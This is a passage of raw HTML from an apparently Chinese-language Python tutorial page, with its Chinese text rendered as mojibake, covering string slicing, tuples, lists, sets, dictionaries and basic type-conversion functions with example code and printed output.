â€¦â€¦</p><p>ä»åé¢ç´¢å¼•  -1 -2 -3 -4 -5 â€¦â€¦</p><p>ä»å‰é¢æˆªå– :1 2 3 4:</p><p>ä»åé¢æˆªå– :-4 -3 -2 -1:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># t</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºæ‰€æœ‰å­—ç¬¦</span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºç¬¬ä¸€ä¸ªåˆ°å€’æ•°ç¬¬äºŒä¸ª</span><span class="token comment"># tes</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token comment"># è¾“å‡ºç¬¬ä¸‰ä¸ªåˆ°ç¬¬å››ä¸ª</span><span class="token comment"># st</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># testtest</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span> <span class="token operator">+</span> <span class="token string">'re'</span><span class="token punctuation">)</span><span class="token comment"># testre</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># t t</span><span class="token triple-quoted-string string">'''testttesttessttesttesttestret t'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pythonå­—ç¬¦ä¸²ä¸èƒ½æ”¹å˜ï¼Œè¯¸å¦‚<code>str[n]='?'</code>çš„èµ‹å€¼ä¼šæŠ¥é”™</p><h4 id="Tuple-å…ƒç»„"><a href="#Tuple-å…ƒç»„" class="headerlink" title="Tuple(å…ƒç»„)"></a>Tuple(å…ƒç»„)</h4><ol><li>å…ƒç»„å…ƒç´ ä¸èƒ½æ›´æ”¹</li><li>å…ƒç»„å†™åœ¨å°æ‹¬å·å†…ï¼Œä»¥<code>,</code>åˆ†éš”</li><li>å„å…ƒç´ ç±»å‹å¯ä»¥ä¸åŒ</li><li>å…ƒç»„çš„ç´¢å¼•åˆ‡ç‰‡æ“ä½œä¸stringä¸€æ ·</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">tuple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'dou'</span><span class="token punctuation">)</span>tuple2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'test2'</span><span class="token punctuation">)</span>tuple3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">)</span>  <span class="token comment"># å•ä¸ªå…ƒç´ åé¢åŠ é€—å·</span>tuple4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># ç©ºå…ƒç»„</span><span class="token keyword">print</span><span class="token punctuation">(</span>tuple4<span class="token punctuation">)</span><span class="token comment"># ()</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token comment"># (1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span>tuple3<span class="token punctuation">)</span><span class="token comment"># (1,)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºç¬¬ä¸€ä¸ªå…ƒç´ </span><span class="token comment"># 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºç¬¬äºŒä¸ªåˆ°ç¬¬ä¸‰ä¸ªå…ƒç´ </span><span class="token comment"># (1.2, 'test')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºæ‰€æœ‰å…ƒç´ </span><span class="token comment"># (1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºæ‰€æœ‰å…ƒç´ </span><span class="token comment"># (1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºç¬¬ä¸‰ä¸ªåŠå‰é¢çš„æ‰€æœ‰</span><span class="token comment"># (1, 1.2, 'test')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># (1, 1.2, 'test', 'dou', 1, 1.2, 'test', 'dou')</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span> <span class="token operator">+</span> tuple2<span class="token punctuation">)</span><span class="token comment"># (1, 1.2, 'test', 'dou', 1, 'test2')</span><span class="token triple-quoted-string string">'''()(1, 1.2, 'test', 'dou')(1,)1(1.2, 'test')(1, 1.2, 'test', 'dou')(1, 1.2, 'test', 'dou')(1, 1.2, 'test')(1, 1.2, 'test', 'dou', 1, 1.2, 'test', 'dou')(1, 1.2, 'test', 'dou', 1, 'test2')'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å¯å˜æ•°æ®"><a href="#å¯å˜æ•°æ®" class="headerlink" title="å¯å˜æ•°æ®"></a>å¯å˜æ•°æ®</h3><h4 id="List-åˆ—è¡¨"><a href="#List-åˆ—è¡¨" class="headerlink" title="List(åˆ—è¡¨)"></a>List(åˆ—è¡¨)</h4><ol><li>ç´¢å¼•æˆªå–æ–¹å¼ä¸å…ƒç»„ç›¸åŒ</li><li>æˆªå–åæˆä¸ºä¸€ä¸ªæ–°åˆ—è¡¨</li><li>å…ƒç´ åœ¨æ‰“æ–¹æ‹¬å·ä¸­ï¼Œä»¥é€—å·åˆ†éš”</li><li>åˆ—è¡¨çš„å…ƒç´ å¯æ”¹å˜</li><li>å…ƒç´ å¯ä»¥æ˜¯å…ƒç»„</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">999</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºå®Œæ•´åˆ—è¡¨</span><span class="token comment"># ['test', 1, 1.2, 999]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºåˆ—è¡¨ç¬¬ä¸€ä¸ªå…ƒç´ </span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># ä»ç¬¬äºŒä¸ªå¼€å§‹è¾“å‡ºåˆ°ç¬¬ä¸‰ä¸ªå…ƒç´ </span><span class="token comment"># [1, 1.2]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºä»ç¬¬ä¸‰ä¸ªå…ƒç´ å¼€å§‹çš„æ‰€æœ‰å…ƒç´ </span><span class="token comment"># [1.2, 999]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2 <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºä¸¤æ¬¡åˆ—è¡¨</span><span class="token comment"># [1, 'test', 1, 'test']</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span> <span class="token operator">+</span> list2<span class="token punctuation">)</span>  <span class="token comment"># è¿æ¥åˆ—è¡¨</span><span class="token comment"># ['test', 1, 1.2, 999, 1, 'test']</span>list3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># [1, 2, 3, 4, 5]</span>list3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'test'</span>  <span class="token comment"># ä¿®æ”¹ç¬¬ä¸€å…ƒç´ </span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># ['test', 2, 3, 4, 5]</span>list3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">]</span>  <span class="token comment"># ä¿®æ”¹ç¬¬ä¸‰ä¸ªåˆ°ç¬¬å››å…ƒç´ </span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># ['test', 2, 22, 33, 5]</span>list4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">)</span><span class="token comment"># [1, 2, 3, 4, 5]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token comment"># ç¬¬ä¸€ä¸ª-1è¡¨ç¤ºä»æœ€åä¸€ä¸ªå¼€å§‹</span><span class="token comment"># ä¸­é—´ä¸ºç©ºè¡¨ç¤ºç§»åŠ¨åˆ°åˆ—è¡¨æœ«,æœ€åä¸€ä¸ª-1ä¸ºæ­¥é•¿,-è¡¨ç¤ºé€†å‘</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># [4, 3, 2]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># [5]</span><span class="token triple-quoted-string string">'''['test', 1, 1.2, 999]test[1, 1.2][1.2, 999][1, 'test', 1, 'test']['test', 1, 1.2, 999, 1, 'test'][1, 2, 3, 4, 5]['test', 2, 3, 4, 5]['test', 2, 22, 33, 5][1, 2, 3, 4, 5][5, 4, 3, 2, 1][4, 3, 2][5]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Set-é›†åˆ"><a href="#Set-é›†åˆ" class="headerlink" title="Set(é›†åˆ)"></a>Set(é›†åˆ)</h4><p>åˆ›å»ºæ ¼å¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">parame <span class="token operator">=</span> <span class="token punctuation">{</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">,</span> â€¦â€¦<span class="token punctuation">}</span><span class="token keyword">or</span><span class="token builtin">set</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># åˆ›å»ºä¸€ä¸ªç©ºé›†åˆ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">sites <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'123'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>sites<span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºé›†åˆï¼Œé‡å¤çš„å…ƒç´ è¢«è‡ªåŠ¨å»æ‰</span><span class="token comment"># {1, '123', 'test'}</span><span class="token comment"># æˆå‘˜æµ‹è¯•</span><span class="token keyword">if</span> <span class="token string">'test'</span> <span class="token keyword">in</span> sites<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test åœ¨é›†åˆä¸­'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test ä¸åœ¨é›†åˆä¸­'</span><span class="token punctuation">)</span><span class="token comment"># setå¯ä»¥è¿›è¡Œé›†åˆè¿ç®—</span>a <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'abracadabra'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'alacazam'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">-</span> b<span class="token punctuation">)</span>  <span class="token comment"># a å’Œ b çš„å·®é›†</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">|</span> b<span class="token punctuation">)</span>  <span class="token comment"># a å’Œ b çš„å¹¶é›†</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">&amp;</span> b<span class="token punctuation">)</span>  <span class="token comment"># a å’Œ b çš„äº¤é›†</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">^</span> b<span class="token punctuation">)</span>  <span class="token comment"># a å’Œ b ä¸­ä¸åŒæ—¶å­˜åœ¨çš„å…ƒç´ </span><span class="token triple-quoted-string string">'''{1, '123', 'test'}test åœ¨é›†åˆä¸­{'a', 'b', 'r', 'c', 'd'}{'b', 'd', 'r'}{'a', 'm', 'r', 'b', 'c', 'd', 'l', 'z'}{'c', 'a'}{'d', 'l', 'r', 'm', 'z', 'b'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Dictionary-å­—å…¸"><a href="#Dictionary-å­—å…¸" class="headerlink" title="Dictionary(å­—å…¸)"></a>Dictionary(å­—å…¸)</h4><ol><li>å­—å…¸æ˜¯æ— åºçš„ï¼Œä¾é é”®å€¼å¯¹æ¥å­˜å–</li><li>å­—å…¸ç”¨<code>{}</code>æ ‡è¯†ï¼Œ <code>é”®(key) : å€¼(value)</code></li><li><code>key</code>ä¸å¯å˜ï¼Œå¹¶ä¸”æ˜¯å”¯ä¸€çš„</li><li>ä½¿ç”¨<code>{}</code>åˆ›å»ºç©ºå­—å…¸</li></ol><p>åˆ›å»ºå­—å…¸</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># ç©ºå­—å…¸</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'test'</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># {2: 'test', 'test': 1}</span>dict2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'dddd'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'test': 1, 1: 'dddd'}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡º2,testçš„å€¼</span><span class="token comment"># test 1</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºæ‰€æœ‰é”®å</span><span class="token comment"># dict_keys(['test', 1])</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºæ‰€æœ‰é”®å€¼</span><span class="token comment"># dict_values([1, 'dddd'])</span><span class="token triple-quoted-string string">'''{2: 'test', 'test': 1}{'test': 1, 1: 'dddd'}test 1dict_keys(['test', 1])dict_values([1, 'dddd'])'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ•°æ®ç±»å‹è½¬æ¢"><a href="#æ•°æ®ç±»å‹è½¬æ¢" class="headerlink" title="æ•°æ®ç±»å‹è½¬æ¢"></a>æ•°æ®ç±»å‹è½¬æ¢</h3><h5 id="class-int-x-base-10"><a href="#class-int-x-base-10" class="headerlink" title="class int(x, base=10)"></a><code>class int(x, base=10)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># xä¸ºæ•°å€¼å‹æ—¶,ä¸å†™base,ç›´æ¥å–æ•´,xä¸ºstræ—¶,baseä¸ºè½¬æ¢å‰çš„è¿›åˆ¶</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3.6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11.2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''3-1118'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-float-x"><a href="#class-float-x" class="headerlink" title="class float([x])"></a><code>class float([x])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å°†æ•´æ•°å’Œå­—ç¬¦ä¸²è½¬æ¢æˆæµ®ç‚¹æ•°</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11.2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''1.0-11.212.0'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-complex-real-imag"><a href="#class-complex-real-imag" class="headerlink" title="class complex([real[, imag]])"></a><code>class complex([real[, imag]])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># åˆ›å»ºä¸€ä¸ªå¤æ•°</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token string">'1+3j'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''(1+0j)(1+2j)(1+3j)(1+2j)'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-str-object"><a href="#class-str-object" class="headerlink" title="class str(object='')"></a><code>class str(object='')</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å°†å¯¹è±¡è½¬åŒ–ä¸ºé€‚äºäººé˜…è¯»çš„å½¢å¼</span>s <span class="token operator">=</span> <span class="token string">'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="repr-object"><a href="#repr-object" class="headerlink" title="repr(object)"></a><code>repr(object)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å°†å¯¹è±¡è½¬åŒ–ä¸ºä¾›è§£é‡Šå™¨è¯»å–çš„å½¢å¼</span>dad <span class="token operator">=</span> <span class="token string">'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>dad<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">''''test''''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="eval-expression-globals-locals"><a href="#eval-expression-globals-locals" class="headerlink" title="eval(expression[, globals[, locals]])"></a><code>eval(expression[, globals[, locals]])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># ç”¨æ¥æ‰§è¡Œä¸€ä¸ªå­—ç¬¦ä¸²è¡¨è¾¾å¼ï¼Œå¹¶è¿”å›è¡¨è¾¾å¼çš„å€¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'pow(2,2)'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'2 * 2'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''44'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="tuple-iterable"><a href="#tuple-iterable" class="headerlink" title="tuple( iterable )"></a><code>tuple( iterable )</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å°†å¯è¿­ä»£ç³»åˆ—ï¼ˆå¦‚åˆ—è¡¨ï¼‰è½¬æ¢ä¸ºå…ƒç»„</span><span class="token comment"># tuple() å¯ä»¥å°†å­—ç¬¦ä¸²ï¼Œåˆ—è¡¨ï¼Œå­—å…¸ï¼Œé›†åˆè½¬åŒ–ä¸ºå…ƒç»„</span>list1<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'12'</span><span class="token punctuation">,</span> <span class="token string">'34'</span><span class="token punctuation">,</span> <span class="token string">'56'</span><span class="token punctuation">,</span> <span class="token string">'78'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ('12', '34', '56', '78')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="list-seq"><a href="#list-seq" class="headerlink" title="list( seq )"></a><code>list( seq )</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># ç”¨äºå°†å…ƒç»„æˆ–å­—ç¬¦ä¸²è½¬æ¢ä¸ºåˆ—è¡¨</span>aTuple <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">)</span>list1 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>aTuple<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"åˆ—è¡¨å…ƒç´  : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># [123, 'Google', 'Runoob', 'Taobao']</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Hello World"</span>list2<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"åˆ—è¡¨å…ƒç´  : "</span><span class="token punctuation">,</span> list2<span class="token punctuation">)</span><span class="token comment"># åˆ—è¡¨å…ƒç´  :  ['H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd']</span><span aria-hidden="true" 